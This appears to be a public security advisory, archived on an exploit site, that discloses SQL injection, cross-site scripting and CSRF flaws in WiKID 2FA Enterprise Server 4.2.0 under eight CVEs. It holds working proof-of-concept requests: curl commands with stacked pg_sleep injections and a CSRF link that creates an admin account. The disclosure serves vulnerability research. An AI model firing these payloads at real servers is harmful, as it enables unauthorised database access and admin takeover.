@@ -1,0 +1,76 @@
+id: 33398
+date: 10/21/2019
+title: WiKID Systems 2FA Enterprise Server 4.2.0-b2032 SQL Injection / XSS / CSRF Vulnerabilities
+author: Aaron Bishop
+cves: CVE-2019-16917, CVE-2019-17114, CVE-2019-17115, CVE-2019-17116, CVE-2019-17117, CVE-2019-17118, CVE-2019-17119, CVE-2019-17120
+
+WiKID Systems 2FA Enterprise Serverversion 4.2.0-b2032 and earlier was
+found to be vulnerable to multiple Cross-Site Scripting, SQLi, and CSRF
+issues.
+
+*searchDevices.jsp* is vulnerable to SQL injection through the *uid* and
+*domain* parameters.  The application uses Postgres which supports Stacked
+Queries, the issue can be seen by submitting a request like:
+
+SLEEP=10; HOST=$RHOST; COOKIE=$COOKIE; time curl -v -i -s -k  -X
+'POST' -H "Host: $HOST" -H "Cookie: JSESSIONID=$COOKIE;" --data-binary
+"uid=test&domain=1;select pg_sleep($SLEEP);--&action=Search"
+https://$HOST/WiKIDAdmin/searchDevices.jsp
+
+The request will cause the database to sleep for 10+ seconds.  This issue
+has been assigned *CVE-2019-16917*.
+
+*processPref.jsp* is vulnerable to SQL injection through the *key* parameter
+if the action parameter is set to *update.*  The following request will
+trigger the issue for an authenticated user:
+
+https://$RHOST/WiKIDAdmin/processPref.jsp?action=Update&key=test%27;%20SELECT%20pg_sleep(5);--
+
+The request will cause the database to sleep for 5+ seconds.  This issue
+has been assigned *CVE-2019-17117.*
+
+*Logs.jsp* is vulnerable to SQL injection through the *substring *and
+*source* parameters.  The following request will demonstrate the issue:
+
+time curl --output /dev/null -s -k -H "Cookie: JSESSIONID=$COOKIE"
+--data-binary "source='; select pg_sleep(5);--"
+https://$RHOST/WiKIDAdmin/Log.jsp
+
+real    0m10.572s
+user    0m0.008s
+sys     0m0.016s
+
+The request will cause the database to sleep for 5+ seconds.  This issue
+has been assigned *CVE-2019-17119*
+
+*usrPreregistration.jsp *is vulnerable to cross site scripting by uploading
+a malicious .csv file containing <script> elements. This issue has been
+assigned *CVE-2019-17114*
+
+*Logs.jsp *is vulnerable to cross site scripting by triggering errors in
+the unauthenticated portion of the application. The errors are severe
+enough to appear in the logs by default.  This issue has been assigned
+*CVE-2019-17115.*
+
+*groups.jsp *is vulnerable to cross site scripting by creating a group with
+a name that contains <script> elements. This issue has been assigned
+*CVE-2019-17116*
+
+*adm_usrs.jsp *is vulnerable to cross site scripting when an admin is
+created with a username containing <script> elements. This issue has been
+assigned *CVE-2019-17120*
+
+The application does not implement CSRF protection.  Tricking an
+authenticated user to click a link like:
+
+<a href="https://$RHOST/WiKIDAdmin/adm_usrs.jsp?usr=pentest&newpass1=password1&newpass2=password1&action=Add">WiKIDAdmin
+Manual</a>
+
+Will result in an admin user unintentionally being created. This issue has
+been assigned *CVE-2019-17118*
+
+https://www.securitymetrics.com/blog/wikid-2fa-enterprise-server-csrf
+https://www.securitymetrics.com/blog/wikid-2fa-enterprise-server-cross-site-scripting
+https://www.securitymetrics.com/blog/wikid-2fa-enterprise-server-sql-injection
+
+#  0day.today [2023-03-26]  #
